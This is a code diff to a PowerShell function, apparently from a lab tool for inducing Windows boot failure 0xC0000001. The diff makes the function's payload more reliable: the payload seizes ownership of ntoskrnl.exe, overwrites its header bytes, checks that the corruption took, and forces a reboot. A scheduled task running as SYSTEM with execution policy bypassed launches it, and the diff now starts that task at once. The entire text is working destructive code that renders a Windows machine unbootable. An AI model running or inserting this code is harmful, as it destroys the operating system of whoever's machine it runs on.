@@ -371,19 +371,36 @@ function Invoke-KernelTamperBreak {
 
     $taskName = "Lab-0xC0000001-KernelTamper"
     $payloadPath = "C:\Windows\Temp\KernelTamperBreak.ps1"
+    $payloadLogPath = "C:\Windows\Temp\KernelTamperBreak.log"
 
     $payload = @'
+$ErrorActionPreference = "Stop"
+
+$logPath = "C:\Windows\Temp\KernelTamperBreak.log"
+function Write-Log {
+    param([string]$Message)
+    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
+    Add-Content -Path $logPath -Value ("[{0}] {1}" -f $ts, $Message)
+}
+
+Write-Log "Payload start."
 Start-Sleep -Seconds 30
 
 $kernelPath = "C:\Windows\System32\ntoskrnl.exe"
 
-if (Test-Path $kernelPath) {
+try {
+    if (-not (Test-Path $kernelPath)) {
+        throw "Kernel path not found: $kernelPath"
+    }
+
+    Write-Log "Taking ownership and ACL grant on ntoskrnl.exe."
     & cmd.exe /c "takeown /f $kernelPath /a" | Out-Null
     & cmd.exe /c "icacls $kernelPath /grant administrators:F /c" | Out-Null
     & cmd.exe /c "attrib -r -s -h $kernelPath" | Out-Null
 
     [byte[]]$corruptBytes = 0x41, 0x42, 0x43, 0x44, 0x45, 0x46
-    $stream = [System.IO.File]::Open($kernelPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Read)
+    Write-Log "Attempting write to kernel header."
+    $stream = [System.IO.File]::Open($kernelPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read)
     try {
         $stream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
         $stream.Write($corruptBytes, 0, $corruptBytes.Length)
@@ -391,9 +408,24 @@ if (Test-Path $kernelPath) {
     } finally {
         $stream.Close()
     }
-}
 
-& cmd.exe /c "shutdown /r /f /t 5 /c \"Lab: trigger 0xC0000001 via kernel tamper\""
+    Write-Log "Verifying written bytes."
+    [byte[]]$verify = [System.IO.File]::ReadAllBytes($kernelPath)[0..5]
+    $ok = $true
+    for ($i = 0; $i -lt 6; $i++) {
+        if ($verify[$i] -ne $corruptBytes[$i]) { $ok = $false; break }
+    }
+
+    if (-not $ok) {
+        throw "Verification failed: kernel bytes do not match expected corruption pattern."
+    }
+
+    Write-Log "Kernel tamper verified. Triggering forced reboot."
+    & cmd.exe /c "shutdown /r /f /t 5 /c \"Lab: trigger 0xC0000001 via kernel tamper\""
+} catch {
+    Write-Log ("Payload failure: " + $_.Exception.Message)
+    throw
+}
 '@
 
     Set-Content -Path $payloadPath -Value $payload -Encoding ASCII -Force
@@ -402,11 +434,20 @@ if (Test-Path $kernelPath) {
     $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $payloadPath"
     $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 15)
 
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
+    Start-ScheduledTask -TaskName $taskName
+
+    Start-Sleep -Seconds 3
+    $taskInfo = Get-ScheduledTaskInfo -TaskName $taskName
+
     Write-Output "  Scheduled task created: $taskName"
     Write-Output "  Payload path           : $payloadPath"
+    Write-Output "  Payload log path       : $payloadLogPath"
     Write-Output "  Trigger time           : $($trigger.StartBoundary)"
+    Write-Output "  Task last run time     : $($taskInfo.LastRunTime)"
+    Write-Output "  Task last result       : $($taskInfo.LastTaskResult)"
     Write-Output "  Expected outcome       : boot failure targeting 0xC0000001 (build-dependent)"
 }
 
